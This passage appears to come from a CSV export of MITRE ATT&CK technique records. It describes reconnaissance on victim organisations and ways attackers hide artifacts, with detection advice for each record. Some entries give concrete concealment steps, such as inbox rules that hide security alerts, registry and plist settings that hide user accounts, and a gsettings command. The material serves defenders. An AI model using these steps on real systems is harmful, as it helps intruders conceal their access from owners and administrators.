Adversaries may easily gather email addresses, since they may be readily available and exposed via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: HackersArise Email)(Citation: CNET Leaks) Email addresses could also be enumerated via more active means (i.e. [Active Scanning](https://attack.mitre.org/techniques/T1595)), such as probing and analyzing responses from authentication services that may reveal valid usernames in a system.(Citation: GrimBlog UsernameEnum) For example, adversaries may be able to enumerate email addresses in Office 365 environments by querying a variety of publicly available API endpoints, such as autodiscover and GetCredentialType.(Citation: GitHub Office 365 User Enumeration)(Citation: Azure Active Directory Reconnaisance)

Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Email Accounts](https://attack.mitre.org/techniques/T1586/002)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Brute Force](https://attack.mitre.org/techniques/T1110) via [External Remote Services](https://attack.mitre.org/techniques/T1133)).",https://attack.mitre.org/techniques/T1589/002,02 October 2020,21 October 2022,enterprise-attack,1.2,Reconnaissance,"Monitor for suspicious network traffic that could be indicative of probing for email addresses and/or usernames, such as large/iterative quantities of authentication requests originating from a single source (especially if the source is known to be associated with an adversary/botnet). Analyzing web metadata may also reveal artifacts that can be attributed to potentially malicious activity, such as referer or user-agent string HTTP/S fields.

Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,Network Traffic: Network Traffic Content,True,T1589,,"Jannie Li, Microsoft Threat Intelligence Center (MSTIC)",,,,,,"(Citation: Google EXOTIC LILY March 2022),(Citation: SecureWorks August 2019),(Citation: Amnesty Intl. Ocean Lotus February 2021),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: Anomali Static Kitten February 2021),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: ClearSky Siamesekitten August 2021),(Citation: MSTIC DEV-0537 Mar 2022),(Citation: AADInternals Documentation),(Citation: Azure AD Recon),(Citation: Proofpoint TA453 July2021),(Citation: Volexity Exchange Marauder March 2021),(Citation: Malwarebytes Kimsuky June 2021),(Citation: Google Iran Threats October 2021),(Citation: DOJ Iran Indictments March 2018),(Citation: Unit 42 TA551 Jan 2021),"
T1589.003,attack-pattern--76551c52-b111-4884-bc47-ff3e728f0156,Gather Victim Identity Information: Employee Names,"Adversaries may gather employee names that can be used during targeting. Employee names be used to derive email addresses as well as to help guide other reconnaissance efforts and/or craft more-believable lures.

Adversaries may easily gather employee names, since they may be readily available and exposed via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: OPM Leak) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).",https://attack.mitre.org/techniques/T1589/003,02 October 2020,15 April 2021,enterprise-attack,1.0,Reconnaissance,"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,,True,T1589,,,,,,,,"(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: DOJ Iran Indictments March 2018),(Citation: KISA Operation Muzabi),"
T1590.002,attack-pattern--0ff59227-8aa8-4c09-bf1f-925605bd07ea,Gather Victim Network Information: DNS,"Adversaries may gather information about the victim's DNS that can be used during targeting. DNS information may include a variety of details, including registered name servers as well as records that outline addressing for a target’s subdomains, mail servers, and other hosts. DNS, MX, TXT, and SPF records may also reveal the use of third party cloud and SaaS providers, such as Office 365, G Suite, Salesforce, or Zendesk.(Citation: Sean Metcalf Twitter DNS Records)

Adversaries may gather this information in various ways, such as querying or otherwise collecting details via [DNS/Passive DNS](https://attack.mitre.org/techniques/T1596/001). DNS information may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596), [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593), or [Active Scanning](https://attack.mitre.org/techniques/T1595)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).",https://attack.mitre.org/techniques/T1590/002,02 October 2020,21 October 2022,enterprise-attack,1.1,Reconnaissance,"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,,True,T1590,,"Jannie Li, Microsoft Threat Intelligence Center (MSTIC)",,,,,,","
T1590.001,attack-pattern--e3b168bd-fcd7-439e-9382-2e6c2f63514d,Gather Victim Network Information: Domain Properties,"Adversaries may gather information about the victim's network domain(s) that can be used during targeting. Information about domains and their properties may include a variety of details, including what domain(s) the victim owns as well as administrative data (ex: name, registrar, etc.) and more directly actionable information such as contacts (email addresses and phone numbers), business addresses, and name servers.

Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about victim domains and their properties may also be exposed to adversaries via online or other accessible data sets (ex: [WHOIS](https://attack.mitre.org/techniques/T1596/002)).(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Where third-party cloud providers are in use, this information may also be exposed through publicly available API endpoints, such as GetUserRealm and autodiscover in Office 365 environments.(Citation: Azure Active Directory Reconnaisance)(Citation: Office 265 Azure Domain Availability) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596), [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593), or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)).",https://attack.mitre.org/techniques/T1590/001,02 October 2020,21 October 2022,enterprise-attack,1.1,Reconnaissance,"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,,True,T1590,,"Jannie Li, Microsoft Threat Intelligence Center (MSTIC)",,,,,,"(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Azure AD Recon),(Citation: AADInternals Documentation),"
T1590.005,attack-pattern--0dda99f0-4701-48ca-9774-8504922e92d3,Gather Victim Network Information: IP Addresses,"Adversaries may gather the victim's IP addresses that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses. Information about assigned IP addresses may include a variety of details, such as which IP addresses are in use. IP addresses may also enable an adversary to derive other details about a victim, such as organizational size, physical location(s), Internet service provider, and or where/how their publicly-facing infrastructure is hosted.

Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about assigned IP addresses may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).",https://attack.mitre.org/techniques/T1590/005,02 October 2020,15 April 2021,enterprise-attack,1.0,Reconnaissance,"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,,True,T1590,,,,,,,,"(Citation: AhnLab Andariel Subgroup of Lazarus June 2018),(Citation: Volexity Exchange Marauder March 2021),(Citation: Google Iran Threats October 2021),"
T1590.006,attack-pattern--6c2957f9-502a-478c-b1dd-d626c0659413,Gather Victim Network Information: Network Security Appliances,"Adversaries may gather information about the victim's network security appliances that can be used during targeting. Information about network security appliances may include a variety of details, such as the existence and specifics of deployed firewalls, content filters, and proxies/bastion hosts. Adversaries may also target information about victim network-based intrusion detection systems (NIDS) or other appliances related to defensive cybersecurity operations.

Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598).(Citation: Nmap Firewalls NIDS) Information about network security appliances may also be exposed to adversaries via online or other accessible data sets (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).",https://attack.mitre.org/techniques/T1590/006,02 October 2020,15 April 2021,enterprise-attack,1.0,Reconnaissance,"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,,True,T1590,,,,,,,,","
T1590.004,attack-pattern--34ab90a3-05f6-4259-8f21-621081fdaba5,Gather Victim Network Information: Network Topology,"Adversaries may gather information about the victim's network topology that can be used during targeting. Information about network topologies may include a variety of details, including the physical and/or logical arrangement of both external-facing and internal network environments. This information may also include specifics regarding network devices (gateways, routers, etc.) and other infrastructure.

Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about network topologies may also be exposed to adversaries via online or other accessible data sets (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: DNS Dumpster) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).",https://attack.mitre.org/techniques/T1590/004,02 October 2020,15 April 2021,enterprise-attack,1.0,Reconnaissance,"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,,True,T1590,,,,,,,,"(Citation: Mandiant FIN13 Aug 2022),"
T1590.003,attack-pattern--36aa137f-5166-41f8-b2f0-a4cfa1b4133e,Gather Victim Network Information: Network Trust Dependencies,"Adversaries may gather information about the victim's network trust dependencies that can be used during targeting. Information about network trusts may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access.

Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about network trusts may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: Pentesting AD Forests) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",https://attack.mitre.org/techniques/T1590/003,02 October 2020,15 April 2021,enterprise-attack,1.0,Reconnaissance,"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,,True,T1590,,,,,,,,","
T1591.002,attack-pattern--6ee2dc99-91ad-4534-a7d8-a649358c331f,Gather Victim Org Information: Business Relationships,"Adversaries may gather information about the victim's business relationships that can be used during targeting. Information about an organization’s business relationships may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access. This information may also reveal supply chains and shipment paths for the victim’s hardware and software resources.

Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about business relationships may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: ThreatPost Broadvoice Leak) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195), [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",https://attack.mitre.org/techniques/T1591/002,02 October 2020,15 April 2021,enterprise-attack,1.0,Reconnaissance,"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,,True,T1591,,,,,,,,"(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Gigamon Berserk Bear October 2021),(Citation: MSTIC DEV-0537 Mar 2022),"
T1591.001,attack-pattern--ed730f20-0e44-48b9-85f8-0e2adeb76867,Gather Victim Org Information: Determine Physical Locations,"Adversaries may gather the victim's physical location(s) that can be used during targeting. Information about physical locations of a target organization may include a variety of details, including where key resources and infrastructure are housed. Physical locations may also indicate what legal jurisdiction and/or authorities the victim operates within.

Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Physical locations of a target organization may also be exposed to adversaries via online or other accessible data sets (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594) or [Social Media](https://attack.mitre.org/techniques/T1593/001)).(Citation: ThreatPost Broadvoice Leak)(Citation: SEC EDGAR Search) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Hardware Additions](https://attack.mitre.org/techniques/T1200)).",https://attack.mitre.org/techniques/T1591/001,02 October 2020,27 August 2021,enterprise-attack,1.1,Reconnaissance,"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,,True,T1591,,,,,,,,"(Citation: Google Iran Threats October 2021),"
T1591.003,attack-pattern--2339cf19-8f1e-48f7-8a91-0262ba547b6f,Gather Victim Org Information: Identify Business Tempo,"Adversaries may gather information about the victim's business tempo that can be used during targeting. Information about an organization’s business tempo may include a variety of details, including operational hours/days of the week. This information may also reveal times/dates of purchases and shipments of the victim’s hardware and software resources.

Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about business tempo may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: ThreatPost Broadvoice Leak) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199))",https://attack.mitre.org/techniques/T1591/003,02 October 2020,15 April 2021,enterprise-attack,1.0,Reconnaissance,"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,,True,T1591,,,,,,,,","
T1591.004,attack-pattern--cc723aff-ec88-40e3-a224-5af9fd983cc4,Gather Victim Org Information: Identify Roles,"Adversaries may gather information about identities and roles within the victim organization that can be used during targeting. Information about business roles may reveal a variety of targetable details, including identifiable information for key personnel as well as what data/resources they have access to.

Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about business roles may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: ThreatPost Broadvoice Leak) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)).",https://attack.mitre.org/techniques/T1591/004,02 October 2020,15 April 2021,enterprise-attack,1.0,Reconnaissance,"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,,True,T1591,,,,,,,,"(Citation: SecureWorks August 2019),(Citation: ESET Lazarus Jun 2020),(Citation: ClearSky Lazarus Aug 2020),(Citation: ClearSky Siamesekitten August 2021),(Citation: MSTIC DEV-0537 Mar 2022),"
T1564.008,attack-pattern--0cf55441-b176-4332-89e7-2c4c7799d0ff,Hide Artifacts: Email Hiding Rules,"Adversaries may use email rules to hide inbound emails in a compromised user's mailbox. Many email clients allow users to create inbox rules for various email functions, including moving emails to other folders, marking emails as read, or deleting emails. Rules may be created or modified within email clients or through external features such as the <code>New-InboxRule</code> or <code>Set-InboxRule</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets on Windows systems.(Citation: Microsoft Inbox Rules)(Citation: MacOS Email Rules)(Citation: Microsoft New-InboxRule)(Citation: Microsoft Set-InboxRule)

Adversaries may utilize email rules within a compromised user's mailbox to delete and/or move emails to less noticeable folders. Adversaries may do this to hide security alerts, C2 communication, or responses to [Internal Spearphishing](https://attack.mitre.org/techniques/T1534) emails sent from the compromised account.

Any user or administrator within the organization (or adversary with valid credentials) may be able to create rules to automatically move or delete emails. These rules can be abused to impair/delay detection had the email content been immediately seen by a user or defender. Malicious rules commonly filter out emails based on key words (such as <code>malware</code>, <code>suspicious</code>, <code>phish</code>, and <code>hack</code>) found in message bodies and subject lines. (Citation: Microsoft Cloud App Security)

In some environments, administrators may be able to enable email rules that operate organization-wide rather than on individual inboxes. For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions.(Citation: Microsoft Mail Flow Rules 2023) Adversaries that abuse such features may be able to automatically modify or delete all emails related to specific topics (such as internal security incident notifications).",https://attack.mitre.org/techniques/T1564/008,07 June 2021,16 October 2023,enterprise-attack,1.3,Defense Evasion,"Monitor email clients and applications for suspicious activity, such as missing messages or abnormal configuration and/or log entries.

On Windows systems, monitor for creation of suspicious inbox rules through the use of the <code>New-InboxRule</code> and <code>Set-InboxRule</code> PowerShell cmdlets.(Citation: Microsoft BEC Campaign) On MacOS systems, monitor for modifications to the <code>RulesActiveState.plist</code>, <code>SyncedRules.plist</code>, <code>UnsyncedRules.plist</code>, and <code>MessageRules.plist</code> files.(Citation: MacOS Email Rules)","Google Workspace, Linux, Office 365, Windows, macOS","Application Log: Application Log Content, Command: Command Execution, File: File Modification",True,T1564,,"Dor Edry, Microsoft; Liran Ravich, CardinalOps",,,,,,"(Citation: FireEye Hacking FIN4 Dec 2014),(Citation: Microsoft Manage Mail Flow Rules 2023),(Citation: Microsoft Get-InboxRule)"
T1564.005,attack-pattern--dfebc3b7-d19d-450b-81c7-6dafe4184c04,Hide Artifacts: Hidden File System,"Adversaries may use a hidden file system to conceal malicious activity from users and security tools. File systems provide a structure to store and access data from physical storage. Typically, a user engages with a file system through applications that allow them to access files and directories, which are an abstraction from their physical location (ex: disk sector). Standard file systems include FAT, NTFS, ext4, and APFS. File systems can also contain other structures, such as the Volume Boot Record (VBR) and Master File Table (MFT) in NTFS.(Citation: MalwareTech VFS Nov 2014)

Adversaries may use their own abstracted file system, separate from the standard file system present on the infected system. In doing so, adversaries can hide the presence of malicious components and file input/output from security tools. Hidden file systems, sometimes referred to as virtual file systems, can be implemented in numerous ways. One implementation would be to store a file system in reserved disk space unused by disk structures or standard file system partitions.(Citation: MalwareTech VFS Nov 2014)(Citation: FireEye Bootkits) Another implementation could be for an adversary to drop their own portable partition image as a file on top of the standard file system.(Citation: ESET ComRAT May 2020) Adversaries may also fragment files across the existing file system structure in non-standard ways.(Citation: Kaspersky Equation QA)",https://attack.mitre.org/techniques/T1564/005,28 June 2020,29 June 2020,enterprise-attack,1.0,Defense Evasion,"Detecting the use of a hidden file system may be exceptionally difficult depending on the implementation. Emphasis may be placed on detecting related aspects of the adversary lifecycle, such as how malware interacts with the hidden file system or how a hidden file system is loaded. Consider looking for anomalous interactions with the Registry or with a particular file on disk. Likewise, if the hidden file system is loaded on boot from reserved disk space, consider shifting focus to detecting [Bootkit](https://attack.mitre.org/techniques/T1542/003) activity.","Linux, Windows, macOS","File: File Modification, Firmware: Firmware Modification, Windows Registry: Windows Registry Key Modification",True,T1564,,,"Administrator, User",,,,,"(Citation: Kaspersky Regin),(Citation: Joint Cybersecurity Advisory AA23-129A Snake Malware May 2023),(Citation: ESET ComRAT May 2020),(Citation: FireEye Bootkits),(Citation: Kaspersky ProjectSauron Full Report),(Citation: Kaspersky Equation QA),"
T1564.001,attack-pattern--ec8fc7e2-b356-455c-8db5-2e37be158e7d,Hide Artifacts: Hidden Files and Directories,"Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (<code>dir /a</code> for Windows and <code>ls –a</code> for Linux and macOS).

On Linux and Mac, users can mark specific files as hidden simply by putting a “.” as the first character in the file or folder name  (Citation: Sofacy Komplex Trojan) (Citation: Antiquated Mac Malware). Files and folders that start with a period, ‘.’, are by default hidden from being viewed in the Finder application and standard command-line utilities like “ls”. Users must specifically change settings to have these files viewable.

Files on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app (Citation: WireLurker). On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn’t clutter up the user’s workspace. For example, SSH utilities create a .ssh folder that’s hidden and contains the user’s known hosts and keys.

Adversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.",https://attack.mitre.org/techniques/T1564/001,26 February 2020,29 March 2020,enterprise-attack,1.0,Defense Evasion,"Monitor the file system and shell commands for files being created with a leading ""."" and the Windows command-line use of attrib.exe to add the hidden attribute.","Linux, Windows, macOS","Command: Command Execution, File: File Creation, File: File Metadata, Process: Process Creation",True,T1564,Host forensic analysis,,User,,,,,"(Citation: Trend Micro DRBControl February 2020),(Citation: ESET Machete July 2019),(Citation: SentinelOne Lazarus macOS July 2020),(Citation: Avira Mustang Panda January 2020),(Citation: CISA AppleJeus Feb 2021),(Citation: ESET Attor Oct 2019),(Citation: alientvault macspy),(Citation: ESET OceanLotus macOS April 2019),(Citation: Trend Micro Iron Tiger April 2021),(Citation: TrendMicro macOS Dacls May 2020),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: CheckPoint Volatile Cedar March 2015),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: Trend Micro Black Basta October 2022),(Citation: Proofpoint TA416 Europe March 2022),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: Unit 42 BackConfig May 2020),(Citation: Red Canary NETWIRE January 2020),(Citation: Carbon Black Shlayer Feb 2019),(Citation: ESET Okrum July 2019),(Citation: Talos Seduploader Oct 2017),(Citation: NCC Group WastedLocker June 2020),(Citation: wardle evilquest parti),(Citation: Infoblox Lokibot January 2019),(Citation: Unit 42 Rocke January 2019),(Citation: Securelist Calisto July 2018),(Citation: Trusteer Carberp October 2010),(Citation: SentinelLabs Agent Tesla Aug 2020),(Citation: Kaspersky LuminousMoth July 2021),(Citation: QiAnXin APT-C-36 Feb2019),(Citation: Rapid7 HAFNIUM Mar 2021),(Citation: Sofacy Komplex Trojan),(Citation: McAfee Lazarus Resurfaces Feb 2018),(Citation: TrendMicro Tropic Trooper Mar 2018),(Citation: Trend Micro IXESHE 2012),(Citation: CISA MAR SLOTHFULMEDIA October 2020),(Citation: LogRhythm WannaCry),(Citation: TrendMicro MacOS April 2018),(Citation: Symantec Calisto July 2018),(Citation: objsee mac malware 2017),(Citation: Talos Rocke August 2018),(Citation: CoinTicker 2019),(Citation: McAfee Sharpshooter December 2018),(Citation: CISA AR18-352A Quasar RAT December 2018),(Citation: trendmicro xcsset xcode project 2020),(Citation: ESET InvisiMole June 2020),(Citation: Mandiant FIN13 Aug 2022),(Citation: Talos PoetRAT April 2020),(Citation: ESET LoudMiner June 2019),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Lazarus APT January 2022),(Citation: Radware Micropsia July 2018),(Citation: Sygnia Elephant Beetle Jan 2022),"
T1564.002,attack-pattern--8c4aef43-48d5-49aa-b2af-c0cd58d30c3d,Hide Artifacts: Hidden Users,"Adversaries may use hidden users to hide the presence of user accounts they create or modify. Administrators may want to hide users when there are many user accounts on a given system or if they want to hide their administrative or other management accounts from other users. 

In macOS, adversaries can create or modify a user to be hidden through manipulating plist files, folder attributes, and user attributes. To prevent a user from being shown on the login screen and in System Preferences, adversaries can set the userID to be under 500 and set the key value <code>Hide500Users</code> to <code>TRUE</code> in the <code>/Library/Preferences/com.apple.loginwindow</code> plist file.(Citation: Cybereason OSX Pirrit) Every user has a userID associated with it. When the <code>Hide500Users</code> key value is set to <code>TRUE</code>, users with a userID under 500 do not appear on the login screen and in System Preferences. Using the command line, adversaries can use the <code>dscl</code> utility to create hidden user accounts by setting the <code>IsHidden</code> attribute to <code>1</code>. Adversaries can also hide a user’s home folder by changing the <code>chflags</code> to hidden.(Citation: Apple Support Hide a User Account) 

Adversaries may similarly hide user accounts in Windows. Adversaries can set the <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList</code> Registry key value to <code>0</code> for a specific user to prevent that user from being listed on the logon screen.(Citation: FireEye SMOKEDHAM June 2021)(Citation: US-CERT TA18-074A)

On Linux systems, adversaries may hide user accounts from the login screen, also referred to as the greeter. The method an adversary may use depends on which Display Manager the distribution is currently using. For example, on an Ubuntu system using the GNOME Display Manger (GDM), accounts may be hidden from the greeter using the <code>gsettings</code> command (ex: <code>sudo -u gdm gsettings set org.gnome.login-screen disable-user-list true</code>).(Citation: Hide GDM User Accounts) Display Managers are not anchored to specific distributions and may be changed by a user or adversary.",https://attack.mitre.org/techniques/T1564/002,13 March 2020,19 April 2022,enterprise-attack,1.2,Defense Evasion,"Monitor for users that may be hidden from the login screen but still present in additional artifacts of usage such as directories and authentication logs. 

Monitor processes and command-line events for actions that could be taken to add a new user and subsequently hide it from login screens. Monitor Registry events for modifications to the <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList</code> key.

